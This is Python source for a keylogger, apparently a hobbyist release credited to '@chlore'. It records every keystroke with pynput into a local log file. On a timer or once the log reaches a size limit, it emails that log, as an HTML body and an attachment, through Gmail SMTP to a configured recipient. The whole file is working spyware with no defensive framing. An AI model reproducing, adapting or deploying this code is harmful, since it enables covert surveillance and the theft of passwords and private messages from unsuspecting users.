import smtplib, ssl     # conecsion
import datetime, time
import os

# keylogger
from pynput import keyboard as kb

# gmail
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import  MIMEMultipart

espera = 1800 # Waiting time in seconds
timeout = time.time() + espera
   
def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False

def __sizefile__():
    sizeFile = os.stat('log.txt').st_size
    # print(sizeFile)
    if sizeFile > 10000:
        return True
    else:
        return False

def __gmailSend__(credentials = {
    # GMAIL
    'username': 'your email', 
    # GMAIL PASSWORD
    'password': 'password from email', 
    # GMAIL DESTINATION
    'destination': 'your email',}, metodos='default'):

    # Read log
    f = open('log.txt', 'r')
    keys = str(f.read())
    f.close()

    # Create message
    message = MIMEMultipart('alternative')
    message['Subject'] = 'keylogger'
    message['From'] = credentials['password']
    message['To'] = credentials['destination']

    html = f"""
    <html>
    <body>
    <h1>Author: @chlore</h1>
    <h2>Keylogger: metodo = {metodos}</h2> 
    <h3>{keys}</h3><br>
    </body>
    </html>
    """
    # Message HTML
    msg_HTML = MIMEText(html, 'html') # Content HTML
    message.attach(msg_HTML) 

    # File send
    file = 'log.txt'

    with open(file, 'rb') as adjust:
        content_adjust = MIMEBase('application', 'octet-stream')
        content_adjust.set_payload(adjust.read())

    encoders.encode_base64(content_adjust)

    date = datetime.datetime.now()  # Date naw
    date = date.strftime("%D")  

    content_adjust.add_header(
        'Content-Disposition',
        f'attachment; filename= {date}.txt',
    )

    message.attach(content_adjust)
    msg = message.as_string()


    # Create connection
    context = ssl.create_default_context()

    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:
        server.login(credentials['username'], credentials['password'])
        # print('login')
        server.sendmail(credentials['username'], credentials['destination'], msg)
        # print('message send')

def __key__(key):

    # Send file log.txt
    if TimeOut():
        __gmailSend__(metodos='time')
        timeout = time.time() + espera

    # Control log.txt
    if __sizefile__():
        
        # file log.txt send
        __gmailSend__(metodos='file')

        # Date (dia/mes/a??o-hora)
        date = datetime.datetime.now()  # Date naw
        D1 = date.strftime("%F")  # Date (dia-mes-a??o)
        D2 = date.strftime("%H")  # Date (hora)
        D3 = date.strftime("%M")  # Date (minutos)
        
        logDate = '{0}_{1},{2}'.format(D1, D2, D3) # Date (dia-mes-a??o) + (hora,minutos)

        # Rename file log.txt
        os.rename('log.txt', 'log_{}.txt'.format(logDate))

    # keylogger
    f = open('log.txt', 'a')
    key = str(key)

    if key == "Key.backspace" or key == "Key.shift" or key == "Key.caps_lock":
        key_ = ""

    elif key == "Key.space":
        key_ = " "

    elif key == "'\x13'":
        key_ = " [Ctrl C] "

    elif key == "Key.enter":
        key_ = "[ENTER]\n"

    elif str(len(key)) == "3":
        key_ = key[1:2]

    else:
        key_ = key

    f.write(key_)
    f.close()


# Start unlimited cycle
while True:
    with kb.Listener(__key__) as escuchador:
        escuchador.join()